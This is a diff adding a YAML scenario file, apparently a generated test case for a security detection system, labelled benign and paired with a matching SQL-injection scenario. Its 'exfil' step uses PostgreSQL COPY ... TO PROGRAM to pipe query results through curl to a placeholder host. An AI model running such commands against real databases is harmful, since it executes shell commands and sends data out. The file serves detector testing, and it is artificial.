@@ -1,0 +1,32 @@
+scenario_id: gen_ecommerce_60_sql_injection_ben_1747b
+family_id: gen_ecommerce_60_sql_injection_fam_1747
+domain: ecommerce
+time_of_day: '14:10'
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT product_id, name FROM products WHERE order_id = 84409
+  - step_id: exfil
+    sql: COPY (SELECT product_id, name FROM products WHERE status = 'pending') TO
+      PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 198.51.100.254
+      port: 9443
+matched_pair_id: gen_ecommerce_60_sql_injection_pair_1747
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
